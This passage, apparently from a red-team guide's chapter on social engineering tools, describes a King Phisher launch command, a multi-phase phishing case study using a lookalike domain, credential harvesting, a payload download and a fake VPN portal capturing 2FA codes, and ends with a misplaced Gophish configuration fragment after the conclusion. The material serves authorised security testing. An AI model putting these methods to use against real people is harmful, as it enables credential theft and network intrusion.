king-phisher-script send_campaign.py --server "$KP_SERVER" \
    --campaign-id "$CAMPAIGN_ID" \
    --delay 30 \
    --batch-size 10

echo "Campaign launched successfully!"
echo "Monitor results in the King Phisher client or via the API."
```

### Example: Multi-Phase Phishing Campaign

For a comprehensive red team engagement at a large corporation, we used King Phisher to conduct a sophisticated multi-phase campaign:

1. **Reconnaissance and Planning**:
   - Gathered public email addresses from LinkedIn and corporate website
   - Identified organizational structure and reporting relationships
   - Researched recent company events and initiatives for targeted content

2. **Campaign Structure**:
   - Phase 1: Generic IT security update (wide targeting)
   - Phase 2: Department-specific training materials (targeted by department)
   - Phase 3: Executive communications (targeted at management)

3. **Technical Implementation**:
   ```bash
   # Set up King Phisher server with domain similar to corporate training portal
   # training-portal-company.com vs. company-training-portal.com
   
   # Created convincing templates for each phase
   # Configured tracking parameters to measure which departments were most vulnerable
   
   # Set up progressive landing pages
   # - Phase 1: Simple credential harvesting
   # - Phase 2: Document download with payload
   # - Phase 3: Fake VPN portal with two-factor authentication capture
   ```

4. **Metrics and Analysis**:
   - Phase 1: 31% click rate, 22% credential submission
   - Phase 2: 24% click rate, 18% executed payload
   - Phase 3: 47% click rate among executives, 35% provided 2FA codes
   
   This progressive campaign demonstrated increasing effectiveness with more targeted content, with executive-focused phishing achieving the highest success rates.

5. **Lateral Movement**:
   Using the harvested credentials, we demonstrated how attackers could:
   - Access internal systems and data
   - Move laterally through the network
   - Escalate privileges using information from executive accounts

The campaign provided valuable data on the organization's security awareness gaps and highlighted the increased risk from targeted phishing versus generic campaigns.

## Conclusion

Social engineering remains one of the most effective attack vectors for gaining initial access to organizations, regardless of their technical security measures. The tools covered in this chapter provide red teams with the capabilities to test an organization's resilience against these psychological attacks through realistic simulations.

From the versatile Social Engineer Toolkit (SET) to specialized tools like BeEF, Gophish, and King Phisher, red teams can develop comprehensive social engineering campaigns that evaluate different aspects of an organization's security awareness. These tools enable:

1. **Realistic Attack Simulation**: Creating convincing phishing emails, clone websites, and enticing lures
2. **Multi-vector Approaches**: Combining email phishing, browser exploitation, QR codes, and other delivery methods
3. **Detailed Metrics Collection**: Measuring susceptibility rates across different departments and attack types
4. **Targeted Campaign Development**: Creating attacks customized to specific organizations, roles, or vulnerabilities

Remember that successful social engineering is as much about psychology as it is about technology. The most effective campaigns combine technical sophistication with compelling psychological triggers that motivate targets to take the desired actions. By mastering these tools and the psychological principles behind them, red teams can provide organizations with valuable insights into their human security vulnerabilities and help build more resilient security awareness programs.

In the next chapter, we'll explore exploitation frameworks and tools that can be used once initial access has been gained through social engineering or other means, allowing red teams to demonstrate the potential impact of successful attacks.


    "db_path": "$INSTALL_DIR/gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "admin@example.com",
    "logging": {
        "filename": "$LOG_DIR/gophish.log"
    }
}
EOF
else
    # Create standard config
    cat > "$CONFIG_DIR/config.json" << EOF
{
    "admin_server": {
        "listen_url": "0.0.0.0:$ADMIN_PORT",
        "use_tls": false
    },
    "phish_server": {
        "listen_url": "0.0.0.0:$PHISHING_PORT",
        "use_tls": false
    },
    "db_name": "sqlite3",